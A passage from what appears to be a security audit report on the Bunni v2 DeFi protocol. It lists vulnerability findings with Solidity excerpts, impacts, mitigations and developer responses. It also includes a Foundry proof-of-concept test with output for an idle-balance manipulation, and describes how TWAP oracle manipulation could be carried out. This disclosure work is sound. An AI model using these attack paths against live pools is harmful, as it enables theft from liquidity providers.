    address(token).safeApprove(address(vault), 0);
}
```

While there does exist an excess ETH refund at the end of `BunniHubLogic::deposit`, this does not take into account any discrepancy due to the above behavior. Similarly, this is not accounted or refunded to the caller for ERC-20 tokens either. As such, these deltas corresponding to any unused WETH or other ERC-20 tokens will remain in the `BunniHub`. One such place this balance could be erroneously used is in the calculation of the rebalance order output amount in `BunniHook::rebalanceOrderPostHook` which uses the contract balance less the transient `outputBalanceBefore`. Thus, the fulfiller of an order executed via Flood Plain could erroneously benefit from this oversight.

```solidity
    if (args.currency.isAddressZero()) {
        // unwrap WETH output to native ETH
@>      orderOutputAmount = weth.balanceOf(address(this));
        weth.withdraw(orderOutputAmount);
    } else {
        orderOutputAmount = args.currency.balanceOfSelf();
    }
@>  orderOutputAmount -= outputBalanceBefore;
```

While `rebalanceOrderPostHook()` intends to use the actual change in balance from the rebalance order execution based on the transient storage cache, any attempted nested deposit within the `_rebalancePrehookCallback()` that pulls fewer tokens than expected with contribute to the overall contract balance after the transient storage is set. Therefore, `orderOutputAmount` shown below will include this increased balance even after it is decremented by `outputBalanceBefore`:

```solidity
        assembly ("memory-safe") {
            outputBalanceBefore := tload(REBALANCE_OUTPUT_BALANCE_SLOT)
        }
        if (args.currency.isAddressZero()) {
            // unwrap WETH output to native ETH
@>          orderOutputAmount = weth.balanceOf(address(this));
            weth.withdraw(orderOutputAmount);
        } else {
            orderOutputAmount = args.currency.balanceOfSelf();
        }
@>      orderOutputAmount -= outputBalanceBefore;
```

Additionally, other vault edge case behaviour does not appear to be sufficiently handled. Morpho is comprised of the core protocol [Morpho Blue](https://github.com/morpho-org/morpho-blue) and then on top of that there are two versions of [MetaMorpho](https://github.com/morpho-org/metamorpho-v1.1?tab=readme-ov-file). When fork testing against a USDC instance of `MetaMorphoV1_1`, it was observed to have a withdrawal queue length of 3 which specifies which markets to prioritise when withdrawing assets from the underlying protocol. Obtaining all the market ids allows the corresponding supply/borrow assets and shares to be queried. The significance of an error `NotEnoughLiquidity()` that was observed is that too much of the USDC is being actively lent out to allow withdrawals to be processed. This likely depends on how specific vaults and their markets are configured, but can be quite problematic for all core functionality.

**Impact:** While the full impact is not currently completely clear, incorrect accounting due to edge cause vault behavior could result in a slight loss to users and DoS of core functionality due to unhandled reverts.

**Recommended Mitigation:** Consider:
* Explicitly handling the cases where vaults do not take the expected asset amounts.
* Processing refunds to callers for any unused tokens.
* Adding more sophisticated failover logic for vault calls that could unexpectedly revert.

**Bacon Labs:** Fixed first point in [PR \#128](https://github.com/timeless-fi/bunni-v2/pull/128). Acknowledge the point about swaps reverting when theres not enough liquidity in the vault, theres not much that we can do when this happens besides reverting (we could give less output tokens but the swap should revert due to the high slippage anyways).

**Cyfrin:** Verified, the actual token balance change is now used as the raw balance change during deposit in`BunniHub::_updateVaultReserveViaClaimTokens` and any excess amounts are processed accordingly.


### Incorrect oracle truncation allows successive observations to exceed `MAX_ABS_TICK_MOVE`

**Description:** The Bunni `Oracle` library is a modified version of the Uniswap V3 library of the same name. The most notable difference is the inclusion of a constant `MAX_ABS_TICK_MOVE = 9116` which specifies the maximum amount of ticks in either direction that the pool is allowed to move at one time. A minimum interval has been introduced accordingly, such that observations are only recorded if the time elapsed since the previous observation is at least the minimum interval. If the minimum interval has not passed, intermediate observations are truncated to respect the maximum absolute tick move and stored in separate `BunniHook` state.

```solidity
    function write(
        Observation[MAX_CARDINALITY] storage self,
        Observation memory intermediate,
        uint32 index,
        uint32 blockTimestamp,
        int24 tick,
        uint32 cardinality,
        uint32 cardinalityNext,
        uint32 minInterval
    ) internal returns (Observation memory intermediateUpdated, uint32 indexUpdated, uint32 cardinalityUpdated) {
        unchecked {
            // early return if we've already written an observation this block
            if (intermediate.blockTimestamp == blockTimestamp) {
                return (intermediate, index, cardinality);
            }

            // update the intermediate observation using the most recent observation
            // which is always the current intermediate observation
@>          intermediateUpdated = transform(intermediate, blockTimestamp, tick);

            // if the time since the last recorded observation is less than the minimum interval, we store the observation in the intermediate observation
            if (blockTimestamp - self[index].blockTimestamp < minInterval) {
                return (intermediateUpdated, index, cardinality);
            }

            // if the conditions are right, we can bump the cardinality
            if (cardinalityNext > cardinality && index == (cardinality - 1)) {
                cardinalityUpdated = cardinalityNext;
            } else {
                cardinalityUpdated = cardinality;
            }

            indexUpdated = (index + 1) % cardinalityUpdated;
@>          self[indexUpdated] = intermediateUpdated;
        }
    }

    function transform(Observation memory last, uint32 blockTimestamp, int24 tick)
        private
        pure
        returns (Observation memory)
    {
        unchecked {
            uint32 delta = blockTimestamp - last.blockTimestamp;

            // if the current tick moves more than the max abs tick movement
            // then we truncate it down
            if ((tick - last.prevTick) > MAX_ABS_TICK_MOVE) {
                tick = last.prevTick + MAX_ABS_TICK_MOVE;
            } else if ((tick - last.prevTick) < -MAX_ABS_TICK_MOVE) {
                tick = last.prevTick - MAX_ABS_TICK_MOVE;
            }

            return Observation({
                blockTimestamp: blockTimestamp,
                prevTick: tick,
                tickCumulative: last.tickCumulative + int56(tick) * int56(uint56(delta)),
                initialized: true
            });
        }
    }
```

While this logic intends to enforce a maximum difference between the ticks of actual observations made in calls to `write()` by truncation performed in `transform()`, it is instead erroneously enforced on intermediate observations. As such, the stored observations can easily and significantly exceed `MAX_ABS_TICK_MOVE` for a non-zero `minInterval`.

Assuming a `minInterval` of 60 seconds, or 5 Ethereum mainnet blocks, consider the following intermediate observations that respect the maximum absolute tick move, but note that the difference in actual recorded observations is significantly larger:

```
| Timestamp    | Tick     | State changes                                                 |
|--------------|----------|---------------------------------------------------------------|
| timestamp 0  | 100 000  |                                                               |
| timestamp 12 | 109 116  | create an observation with 109 116 and set it as intermediate |
| timestamp 24 | 118 232  | set 118 232 as intermediate                                   |
| timestamp 36 | 127 348  | set 127 348 as intermediate                                   |
| timestamp 48 | 136 464  | set 136 464 as intermediate                                   |
| timestamp 60 | 145 580  | create an observation with 145 580 and set it as intermediate |
```

**Impact:** Given that the difference between observations is not bounded, a malicious actor is much more easily able to manipulate the TWAP. The most impactful scenarios are likely to be:

* For external integrators who rely on the TWAP price of a pool that can be manipulated much easier than intended.
* `BuyTheDipGeometricDistribution` could have its alt alpha triggered much more easily than intended. In one direction, alpha is made to be much smaller, so the liquidity is concentrated very tightly around the spot price which could result in large slippage for honest users. In the other direction, manipulation to a larger alpha could make the liquidity appear artificially deep far from the non-manipulated price, letting an attacker buy or sell huge amounts at artificial rates and basically benefitting from the slippage. It is not clear how feasible such an attack would be as it depends of the minimum oracle observation interval and so likely requires an attacker to be sufficiently well-funded to hold multi-block manipulation.
* If this oracle is used for other LDFs such as `OracleUniGeoDistribution` that rely on a TWAP to define dynamic behavior, this could likely cause similar issues for the bounding.
* Rebalances across all LDFs may also be affected, where it may be possible artificially control the inputs to trigger an unfavourable flood order and extract value from the pools that way.
* The dynamic swap fee is likely to be computed much larger than intended, which results in DoS. If a pool is configured to mutate its LDF assuming truncated oracle observations function as intended, this could cause the LDF to mutate too often and trigger surge fees. The fee is set to 100% and decreases exponentially, so users would be charged a higher fee than they should. Additionally, during the same block in which surging occurs, no swap can be executed because the fee overflows math computations. Hence, if for example an external protocol relies on executing swaps on Bunni during an execution, a malicious actor could make it revert by triggering a surge during the same block.

**Recommended Mitigation:** Enforce truncation between actual recorded observations made once the minimum interval has passed, rather than just on intermediate observations.

**Bacon Labs:** Acknowledged, we think the existing implementation is actually fine. `MAX_ABS_TICK_MOVE` should be the max tick difference between observations in consecutive blocks (`9116` corresponds to a `1.0001^9116=2.488x` price change per block), not between consecutive observations in the storage array. Thus enforcing the max tick move between intermediate observations actually achieves what we want, since intermediate observations are updated at most once every block.

**Cyfrin:** Acknowledged.


### Missing `LDFType` type validation against `ShiftMode` can result in losses due disabled surge fees

**Description:** While it is not required, some existing LDFs shift their liquidity distribution based on behavior derived from the TWAP oracle. If the `ShiftMode` is specified as the `STATIC` variant, the distribution does not shift; however, the LDF can still have dynamic behavior such as that exhibited by `BuyTheDipGeometricDistribution` which switches between alpha parameters depending on the arithmetic mean tick and immutable threshold. For non-static LDFs, `ILiquidityDensityFunction::isValidParams` validates that the TWAP duration is non-zero for non-static shift modes, such that there is never a case where an LDF shifts but there is no valid TWAP value to use.

The `LDFType` is a separate but related configuration specified in the LDF parameters and used in the `BunniHub` to define the surge fee behavior and usage of `s.ldfStates`. Here, the `STATIC` variant defines a stateless LDF (from the perspective of the `BunniHook`) that has no dynamic behavior and, assuming rehypothecation is enabled, surges only based on changes in the vault share price; however, if the `ShiftMode` is not `STATIC` then this disabling of surge fees can result in losses to liquidity providers due to MEV.

It is understood that it is not currently possible to create such a pool using the Bunni UI, though such configs are possible on the smart contract level.

**Impact:** Liquidity providers may be subject to losses due to MEV when surge fees are disabled for static LDFs that exhibit shifting behavior.

**Recommended Mitigation:** Consider enforcing on the smart contract level that a shifting liquidity distribution must correspond to a non-static LDF type.

**Bacon Labs:** Fixed in [PR \#101](https://github.com/timeless-fi/bunni-v2/pull/101).

**Cyfrin:** Verified, a new `ldfType` parameter has been added to `isValidParams()` to validate the required combinations of `ldfType` and `shiftMode` in LDFs.


### am-AMM fees could be incorrectly used by rebalance mechanism as order input

**Description:** As part of the implementation of the autonomous rebalance mechanism in `BunniHook::rebalanceOrderPreHook`, the hook balance of the order output token is set in transient storage before the order is executed. This occurs before the unlock callback, during which `hookHandleSwap()` is called within `_rebalancePrehookCallback()`:

```solidity
    function rebalanceOrderPreHook(RebalanceOrderHookArgs calldata hookArgs) external override nonReentrant {
        ...
        RebalanceOrderPreHookArgs calldata args = hookArgs.preHookArgs;

        // store the order output balance before the order execution in transient storage
        // this is used to compute the order output amount
        uint256 outputBalanceBefore = hookArgs.postHookArgs.currency.isAddressZero()
            ? weth.balanceOf(address(this))
            : hookArgs.postHookArgs.currency.balanceOfSelf();
        assembly ("memory-safe") {
@>          tstore(REBALANCE_OUTPUT_BALANCE_SLOT, outputBalanceBefore)
        }

        // pull input tokens from BunniHub to BunniHook
        // received in the form of PoolManager claim tokens
        // then unwrap claim tokens
        poolManager.unlock(
            abi.encode(
                HookUnlockCallbackType.REBALANCE_PREHOOK,
@>              abi.encode(args.currency, args.amount, hookArgs.key, hookArgs.key.currency1 == args.currency)
            )
        );

        // ensure we have at least args.amount tokens so that there is enough input for the order
@>      if (args.currency.balanceOfSelf() < args.amount) {
            revert BunniHook__PrehookPostConditionFailed();
        }
        ...
    }

    /// @dev Calls hub.hookHandleSwap to pull the rebalance swap input tokens from BunniHub.
    /// Then burns PoolManager claim tokens and takes the underlying tokens from PoolManager.
    /// Used while executing rebalance orders.
    function _rebalancePrehookCallback(bytes memory callbackData) internal {
        // decode data
        (Currency currency, uint256 amount, PoolKey memory key, bool zeroForOne) =
            abi.decode(callbackData, (Currency, uint256, PoolKey, bool));

        // pull claim tokens from BunniHub
@>      hub.hookHandleSwap({key: key, zeroForOne: zeroForOne, inputAmount: 0, outputAmount: amount});

        // lock BunniHub to prevent reentrancy
        hub.lockForRebalance(key);

        // burn and take
        poolManager.burn(address(this), currency.toId(), amount);
        poolManager.take(currency, address(this), amount);
    }
```

The transient storage is again queried in the call to `rebalanceOrderPostHook()` to ensure that only the specified amount of the output token (consideration item) is transferred from `BunniHook`:

```solidity
    function rebalanceOrderPostHook(RebalanceOrderHookArgs calldata hookArgs) external override nonReentrant {
        ...
        RebalanceOrderPostHookArgs calldata args = hookArgs.postHookArgs;

        // compute order output amount by computing the difference in the output token balance
        uint256 orderOutputAmount;
        uint256 outputBalanceBefore;
        assembly ("memory-safe") {
@>          outputBalanceBefore := tload(REBALANCE_OUTPUT_BALANCE_SLOT)
        }
        if (args.currency.isAddressZero()) {
            // unwrap WETH output to native ETH
            orderOutputAmount = weth.balanceOf(address(this));
            weth.withdraw(orderOutputAmount);
        } else {
            orderOutputAmount = args.currency.balanceOfSelf();
        }
@>      orderOutputAmount -= outputBalanceBefore;
        ...
```

However similar such validation is not applied to the input token (offer item). While the existing validation shown above is performed to ensure that the hook holds sufficient tokens to process the order, it fails to consider that the hook may hold funds designated to other recipients. Previously, per the Pashov Group finding H-04, autonomous rebalance was DoSd by checking the token balance was strictly equal to the order amount but forgot to account for am-AMM fees and donations. The recommendation was to check that the contracts token balance increase is equal to `args.amount`, not the total balance.

Given that am-AMM fees are stored as ERC-6909 balances within the `BunniHook`, these could be erroneously used as part of the rebalance order input amount. This could occur when the hook holds insufficient raw balance to cover the input amount, perhaps when rehypothecation is enabled and the `hookHandleSwap()` call pulls fewer tokens than expected due to the vault returning fewer tokens than specified. Instead, the input token balance should be set in transient storage before the unlock callback in the same way that `outputBalanceBefore` is. Then, the difference between the input token balances before the unlock callback and after should be validated to satisfy the order input amount.

**Impact:** am-AMM fees stored as ERC-6909 balance inside `BunniHook` could be erroneously used as rebalance input due to the incorrect balance check.

**Recommended Mitigation:** Consider modifying the validation performed after the unlock callback to:
```solidity
uint256 inputBalanceBefore = args.currency.balanceOfSelf();

// unlock callback

if (args.currency.balanceOfSelf() - inputBalanceBefore < args.amount) {
    revert BunniHook__PrehookPostConditionFailed();
}
```

**Bacon Labs:** Fixed in [PR \#98](https://github.com/timeless-fi/bunni-v2/pull/98) and [PR \#133](https://github.com/timeless-fi/bunni-v2/pull/133).

**Cyfrin:** Verified, stricter input amount validation has been added to`BunniHook::rebalanceOrderPreHook`.


### Idle balance is computed incorrectly when an incorrect vault fee is specified

**Description:** When a new deposit is made into a Bunni pool in which there is already some liquidity, the amounts of each token to deposit are computed based on the current ratio. It is assumed by the current logic that that the idle amount can only increase proportionally to the current balance and that the excess token will not change during the lifetime of the deposit; however, this assumption can be broken when a user deposits funds to a vault and incorrectly specified it fee.

Assuming that:
* There are `1e18` token0/1 in the pool and `1e18` shares minted.
* The price of the tokens is 1:1 as specified by the LDF such that the idle balance is 0.
* The target raw balance for vault0, which has a 10% fee, is 30%.
* Token1 has no vault configured.

The `BunniHub` computes the amounts to deposit as follows:

1. A user passes the amounts to deposit as 1e18 for both tokens but does not specify any vault fee.
2. The `_depositLogic()` function computes the amounts to deposit based on the current token ratio. Hence, it computes an `amount0` and `amount1` of `1e18` tokens. It also computes a `reserveAmount0` of `0.7e18` tokens.
3. The `BunniHub` deposits `0.3e18` token0 and `1e18` token1 to Uniswap to mint the raw balances in ERC-6909 form.
4. It now attempts to deposit the `0.7e18` tokens to vault0. Since the user did not pass the 10% fee, it will compute a `reserveChangeInUnderlying` of `0.63e18` tokens.
5. It now computes the amount of shares to mint by taking the real value added. In this case will be `0.93e18` token0 and `1e18` token1. It takes the minimum, so will mint `0.93e18` shares.
6. It now computes the updated idle balance where it assumes that the same ratio of funds has been deposited. So since the idle balance was previously 0, it will now be 0 too; however, in this case, a value of `1e18` token1 has been provided and only `0.93e18` token0.

**Impact**
Anyone can unbalance the token ratio which will be amplified by subsequent deposits due to the new token ratio. The idle balance is also used when querying the LDF to obtain the active balances against which swaps are performed. Therefore, assuming the price of LP tokens is determined by accounting the total Bunni token supply and the amount of liquidity in the pool, it is possible to atomically change this price through a sort of donation attack which could have serious implications for the desire expressed by Bacon Labs to consider using LP tokens as collateral on lending platforms.

**Proof of Concept**
First create the following `ERC4626FeeMock` inside `test/mocks/ERC4626Mock.sol`:

```solidity
contract ERC4626FeeMock is ERC4626 {
    address internal immutable _asset;
    uint256 public fee;
    uint256 internal constant MAX_FEE = 10000;

    constructor(IERC20 asset_, uint256 _fee) {
        _asset = address(asset_);
        if(_fee > MAX_FEE) revert();
        fee = _fee;
    }

    function setFee(uint256 newFee) external {
        if(newFee > MAX_FEE) revert();
        fee = newFee;
    }

    function deposit(uint256 assets, address to) public override returns (uint256 shares) {
        return super.deposit(assets - assets * fee / MAX_FEE, to);
    }

    function asset() public view override returns (address) {
        return _asset;
    }

    function name() public pure override returns (string memory) {
        return "MockERC4626";
    }

    function symbol() public pure override returns (string memory) {
        return "MOCK-ERC4626";
    }
}
```

Then add it into the `test/BaseTest.sol` imports:
```diff
--  import {ERC4626Mock} from "./mocks/ERC4626Mock.sol";
++  import {ERC4626Mock, ERC4626FeeMock} from "./mocks/ERC4626Mock.sol";
```

The following test can now be added to `test/BunniHub.t.sol`:
```solidity
    function test_WrongIdleBalanceComputation() public {
        ILiquidityDensityFunction uniformDistribution = new UniformDistribution(address(hub), address(bunniHook), address(quoter));
        Currency currency0 = Currency.wrap(address(token0));
        Currency currency1 = Currency.wrap(address(token1));
        ERC4626FeeMock feeVault0 = new ERC4626FeeMock(token0, 0);
        ERC4626 vault0_ = ERC4626(address(feeVault0));
        ERC4626 vault1_ = ERC4626(address(0));
        IBunniToken bunniToken;
        PoolKey memory key;
        (bunniToken, key) = hub.deployBunniToken(
            IBunniHub.DeployBunniTokenParams({
                currency0: currency0,
                currency1: currency1,
                tickSpacing: TICK_SPACING,
                twapSecondsAgo: TWAP_SECONDS_AGO,
                liquidityDensityFunction: uniformDistribution,
                hooklet: IHooklet(address(0)),
                ldfType: LDFType.DYNAMIC_AND_STATEFUL,
                ldfParams: bytes32(abi.encodePacked(ShiftMode.STATIC, int24(-5) * TICK_SPACING, int24(5) * TICK_SPACING)),
                hooks: bunniHook,
                hookParams: abi.encodePacked(
                    FEE_MIN,
                    FEE_MAX,
                    FEE_QUADRATIC_MULTIPLIER,
                    FEE_TWAP_SECONDS_AGO,
                    POOL_MAX_AMAMM_FEE,
                    SURGE_HALFLIFE,
                    SURGE_AUTOSTART_TIME,
                    VAULT_SURGE_THRESHOLD_0,
                    VAULT_SURGE_THRESHOLD_1,
                    REBALANCE_THRESHOLD,
                    REBALANCE_MAX_SLIPPAGE,
                    REBALANCE_TWAP_SECONDS_AGO,
                    REBALANCE_ORDER_TTL,
                    true, // amAmmEnabled
                    ORACLE_MIN_INTERVAL,
                    MIN_RENT_MULTIPLIER
                ),
                vault0: vault0_,
                vault1: vault1_,
                minRawTokenRatio0: 0.20e6,
                targetRawTokenRatio0: 0.30e6,
                maxRawTokenRatio0: 0.40e6,
                minRawTokenRatio1: 0,
                targetRawTokenRatio1: 0,
                maxRawTokenRatio1: 0,
                sqrtPriceX96: TickMath.getSqrtPriceAtTick(0),
                name: bytes32("BunniToken"),
                symbol: bytes32("BUNNI-LP"),
                owner: address(this),
                metadataURI: "metadataURI",
                salt: bytes32(0)
            })
        );

        // make initial deposit to avoid accounting for MIN_INITIAL_SHARES
        uint256 depositAmount0 = 1e18 + 1;
        uint256 depositAmount1 = 1e18 + 1;
        address firstDepositor = makeAddr("firstDepositor");
        vm.startPrank(firstDepositor);
        token0.approve(address(PERMIT2), type(uint256).max);
        token1.approve(address(PERMIT2), type(uint256).max);
        PERMIT2.approve(address(token0), address(hub), type(uint160).max, type(uint48).max);
        PERMIT2.approve(address(token1), address(hub), type(uint160).max, type(uint48).max);
        vm.stopPrank();

        // mint tokens
        _mint(key.currency0, firstDepositor, depositAmount0 * 100);
        _mint(key.currency1, firstDepositor, depositAmount1 * 100);

        // deposit tokens
        IBunniHub.DepositParams memory depositParams = IBunniHub.DepositParams({
            poolKey: key,
            amount0Desired: depositAmount0,
            amount1Desired: depositAmount1,
            amount0Min: 0,
            amount1Min: 0,
            deadline: block.timestamp,
            recipient: firstDepositor,
            refundRecipient: firstDepositor,
            vaultFee0: 0,
            vaultFee1: 0,
            referrer: address(0)
        });

        vm.startPrank(firstDepositor);
            (uint256 sharesFirstDepositor, uint256 firstDepositorAmount0In, uint256 firstDepositorAmount1In) = hub.deposit(depositParams);
            console.log("Amount 0 deposited by first depositor", firstDepositorAmount0In);
            console.log("Amount 1 deposited by first depositor", firstDepositorAmount1In);
            console.log("Total supply shares", bunniToken.totalSupply());
        vm.stopPrank();

        IdleBalance idleBalanceBefore = hub.idleBalance(key.toId());
        (uint256 idleAmountBefore, bool isToken0Before) = IdleBalanceLibrary.fromIdleBalance(idleBalanceBefore);
        feeVault0.setFee(1000);     // 10% fee

        depositAmount0 = 1e18;
        depositAmount1 = 1e18;
        address secondDepositor = makeAddr("secondDepositor");
        vm.startPrank(secondDepositor);
        token0.approve(address(PERMIT2), type(uint256).max);
        token1.approve(address(PERMIT2), type(uint256).max);
        PERMIT2.approve(address(token0), address(hub), type(uint160).max, type(uint48).max);
        PERMIT2.approve(address(token1), address(hub), type(uint160).max, type(uint48).max);
        vm.stopPrank();

        // mint tokens
        _mint(key.currency0, secondDepositor, depositAmount0);
        _mint(key.currency1, secondDepositor, depositAmount1);

        // deposit tokens
        depositParams = IBunniHub.DepositParams({
            poolKey: key,
            amount0Desired: depositAmount0,
            amount1Desired: depositAmount1,
            amount0Min: 0,
            amount1Min: 0,
            deadline: block.timestamp,
            recipient: secondDepositor,
            refundRecipient: secondDepositor,
            vaultFee0: 0,
            vaultFee1: 0,
            referrer: address(0)
        });

        vm.prank(secondDepositor);
        (uint256 sharesSecondDepositor, uint256 secondDepositorAmount0In, uint256 secondDepositorAmount1In) = hub.deposit(depositParams);
        console.log("Amount 0 deposited by second depositor", secondDepositorAmount0In);
        console.log("Amount 1 deposited by second depositor", secondDepositorAmount1In);

        logBalances(key);
        console.log("Total shares afterwards", bunniToken.totalSupply());
        IdleBalance idleBalanceAfter = hub.idleBalance(key.toId());
        (uint256 idleAmountAfter, bool isToken0After) = IdleBalanceLibrary.fromIdleBalance(idleBalanceAfter);
        console.log("Idle balance before", idleAmountBefore);
        console.log("Is idle balance in token0 before?", isToken0Before);
        console.log("Idle balance after", idleAmountAfter);
        console.log("Is idle balance in token0 after?", isToken0Before);
    }
```

Output:
```
Ran 1 test for test/BunniHub.t.sol:BunniHubTest
[PASS] test_WrongIdleBalanceComputation() (gas: 4764066)
Logs:
  Amount 0 deposited by first depositor 1000000000000000000
  Amount 1 deposited by first depositor 1000000000000000000
  Total supply shares 1000000000000000000
  Amount 0 deposited by second depositor 930000000000000000
  Amount 1 deposited by second depositor 1000000000000000000
  Balance 0 1930000000000000000
  Balance 1 2000000000000000000
  Total shares afterwards 1930000000000000000
  Idle balance before 0
  Is idle balance in token0 before? true
  Idle balance after 0
  Is idle balance in token0 after? true

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.79s (6.24ms CPU time)

Ran 1 test suite in 1.79s (1.79s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

**Recommended Mitigation:** The following are two possible solutions:
1. If the user specifies a vault fee, it is ensured that the `reserveChangeInUnderlying` does not deviate too far from the expected amount and so users cannot make significant modifications the token ratio; however, when the vault fee is specified as 0, this check is not executed. Consider validating against the expected result computed by the `_depositLogic()` function in both cases, and revert if the `reserveChangeInUnderlying` is significantly different.
2. Consider recomputing the idle balance completely after each deposit.

**Bacon Labs:** Fixed in [PR \#119](https://github.com/timeless-fi/bunni-v2/pull/119).

**Cyfrin:** Verified, the vault fee check is enforced even whenspecified as zeroto avoid idle balance manipulation and donation attacks.


### Potential cross-contract re-entrancy between `BunniHub::deposit` and `BunniToken` can corrupt Hooklet state

**Description:** Hooklets are intended to allow pool deployers to inject custom logic into various key pool operations such as initialization, deposits, withdrawals, swaps and Bunni token transfers.

To ensure that the hooklet invocations receive actual return values, all after operation hooks should be placed at the end of the corresponding functions; however, `BunniHubLogic::deposit` refunds excess ETH to users before the `hookletAfterDeposit()` call is executed which can result in cross-contract reentrancy when a user transfers Bunni tokens before the hooklet's state has updated:

```solidity
    function deposit(HubStorage storage s, Env calldata env, IBunniHub.DepositParams calldata params)
        external
        returns (uint256 shares, uint256 amount0, uint256 amount1)
    {
        ...
        // refund excess ETH
        if (params.poolKey.currency0.isAddressZero()) {
            if (address(this).balance != 0) {
@>              params.refundRecipient.safeTransferETH(
                    FixedPointMathLib.min(address(this).balance, msg.value - amount0Spent)
                );
            }
        } else if (params.poolKey.currency1.isAddressZero()) {
            if (address(this).balance != 0) {
@>              params.refundRecipient.safeTransferETH(
                    FixedPointMathLib.min(address(this).balance, msg.value - amount1Spent)
                );
            }
        }

        // emit event
        emit IBunniHub.Deposit(msgSender, params.recipient, poolId, amount0, amount1, shares);

        /// -----------------------------------------------------------------------
        /// Hooklet call
        /// -----------------------------------------------------------------------

@>      state.hooklet.hookletAfterDeposit(
            msgSender, params, IHooklet.DepositReturnData({shares: shares, amount0: amount0, amount1: amount1})
        );
    }
```

This causes the `BunniToken` transfer hooks to be invoked on the Hooklet before notification of the deposit has concluded:

```solidity
    function _beforeTokenTransfer(address from, address to, uint256 amount, address newReferrer) internal override {
        ...
        // call hooklet
        // occurs after the referral reward accrual to prevent the hooklet from
        // messing up the accounting
        IHooklet hooklet_ = hooklet();
        if (hooklet_.hasPermission(HookletLib.BEFORE_TRANSFER_FLAG)) {
@>          hooklet_.hookletBeforeTransfer(msg.sender, poolKey(), this, from, to, amount);
        }
    }

    function _afterTokenTransfer(address from, address to, uint256 amount) internal override {
        // call hooklet
        IHooklet hooklet_ = hooklet();
        if (hooklet_.hasPermission(HookletLib.AFTER_TRANSFER_FLAG)) {
@>          hooklet_.hookletAfterTransfer(msg.sender, poolKey(), this, from, to, amount);
        }
    }
```

**Impact:** The potential impact depends on the custom logic of a given Hooklet implementation and its associated accounting.

**Recommended Mitigation:** Consider moving the refund logic to after the `hookletAfterDeposit()` call. This ensures that the hooklet's state is updated before the refund is made, preventing the potential for re-entrancy.

**Bacon Labs:** Fixed in [PR \#120](https://github.com/timeless-fi/bunni-v2/pull/120).

**Cyfrin:** Verified, the excess ETH refund in `BunniHubLogic::deposit` has been moved to after the Hooklet call.


### Inconsistent Hooklet data provisioning for rebalancing operations

**Description:** Bunni utilizes Hooklets to enable pool deployers to inject custom logic into various pool operations, allowing for the implementation of advanced strategies, customized behavior, and integration with external systems. These Hooklets can be invoked during key operations, including initialization, deposits, withdrawals, swaps, and Bunni token transfers.

Based on the `IHooklet` interface, it appears that "before operation" Hooklet invocations are passed the user input data and in turn "after operation" Hooklet invocations receive the operations return data. The return data from deposit, withdraw, and swap functionality always contains pool reserve changes, which can be used in the custom logic of a Hooklet:

```solidity
    struct DepositReturnData {
        uint256 shares;
@>      uint256 amount0;
@>      uint256 amount1;
    }

    ...

    struct WithdrawReturnData {
@>      uint256 amount0;
@>      uint256 amount1;
    }

    ...

    struct SwapReturnData {
        uint160 updatedSqrtPriceX96;
        int24 updatedTick;
@>      uint256 inputAmount;
@>      uint256 outputAmount;
        uint24 swapFee;
        uint256 totalLiquidity;
    }
```

However, the protocol rebalancing functionality fails to deliver any such information to Hooklets, meaning that any custom Hooklet logic based on changing reserves can not be implemented.

**Impact:** The absence of reserve information for rebalancing operations limits the ability of Hooklets to implement custom logic that relies on this data. This inconsistency in data provisioning may hinder the development of advanced strategies and customized behavior, ultimately affecting the overall functionality and usability of the protocol.

**Recommended Mitigation:** Bunni should provide reserve change information to its Hooklets during rebalancing operations. This could be achieved by reusing the `afterSwap()` hook, and implementing the `beforeSwap()` hook could also be useful; however, it would be preferable to introduce a distinct rebalance hooklet call.

**Bacon Labs:** Fixed in [PR \#121](https://github.com/timeless-fi/bunni-v2/pull/121) and [PR \#133](https://github.com/timeless-fi/bunni-v2/pull/133).

**Cyfrin:** Verified, `IHooklet.afterRebalance` is now called after rebalance order execution.


### Swap fees can exceed 100\%, causing unexpected reverts or overcharging

**Description:** The dynamic surge fee mechanism prevents sandwich attacks during autonomous liquidity modifications by starting high at a maximum surge fee of 100% and decreasing exponentially. When the pool is managed by an am-AMM manager, the swap fee and hook fee are calculated separately using the full swap amount. While this design solves the problem of inconsistently computing the hook fee between cases when am-AMM management is enabled/disabled, it does not prevent the surge fee from exceeding 100%.

The fee calculation is is performed as part of the `BunniHookLogic::beforeSwap` logic. The first step is determine the base swap fee percentage (1). It is fully charged when am-AMM management is disabled (2 -> 3). In the other case, only the hook fee portion of the base fee is charged and the am-AMM manager fee is used instead of the portion of the base fee corresponding to LP fees (4 -> 3). Thus, the full fee is equal to `swapFeeAmount + hookFeesAmount`.

```solidity
(1)>    uint24 hookFeesBaseSwapFee = feeOverridden
            ? feeOverride
            : computeDynamicSwapFee(
                updatedSqrtPriceX96,
                feeMeanTick,
                lastSurgeTimestamp,
                hookParams.feeMin,
                hookParams.feeMax,
                hookParams.feeQuadraticMultiplier,
                hookParams.surgeFeeHalfLife
            );
        swapFee = useAmAmmFee
(4)>        ? uint24(FixedPointMathLib.max(amAmmSwapFee, computeSurgeFee(lastSurgeTimestamp, hookParams.surgeFeeHalfLife)))
(2)>        : hookFeesBaseSwapFee;
        uint256 hookFeesAmount;
        uint256 hookHandleSwapInputAmount;
        uint256 hookHandleSwapOutoutAmount;
        if (exactIn) {
            // compute the swap fee and the hook fee (i.e. protocol fee)
            // swap fee is taken by decreasing the output amount
(3)>        swapFeeAmount = outputAmount.mulDivUp(swapFee, SWAP_FEE_BASE);
            if (useAmAmmFee) {
                // instead of computing hook fees as a portion of the swap fee
                // and deducting it, we compute hook fees separately using hookFeesBaseSwapFee
                // and charge it as an extra fee on the swap
(5)>            hookFeesAmount = outputAmount.mulDivUp(hookFeesBaseSwapFee, SWAP_FEE_BASE).mulDivUp(
                    env.hookFeeModifier, MODIFIER_BASE
                );
            } else {
                hookFeesAmount = swapFeeAmount.mulDivUp(env.hookFeeModifier, MODIFIER_BASE);
                swapFeeAmount -= hookFeesAmount;
            }
```

Assuming am-AMM management is enabled and the surge fee is 100%, `computeSurgeFee()` returns `SWAP_FEE_BASE` and `swapFee` is 100% (4 -> 3); however, the value returned by `computeDynamicSwapFee()` can also be up to `SWAP_FEE_BASE` depending on other conditions, so `hookFeesBaseSwapFee` is in the range (0, `SWAP_FEE_BASE`] which results in a non-zero `hookFeesAmount` (1 -> 5). Therefore, the `swapFeeAmount + hookFeesAmount` sum exceeds `outputAmount` and causes an unexpected revert due to underflow.

```solidity
        // modify output amount with fees
@>      outputAmount -= swapFeeAmount + hookFeesAmount;
```

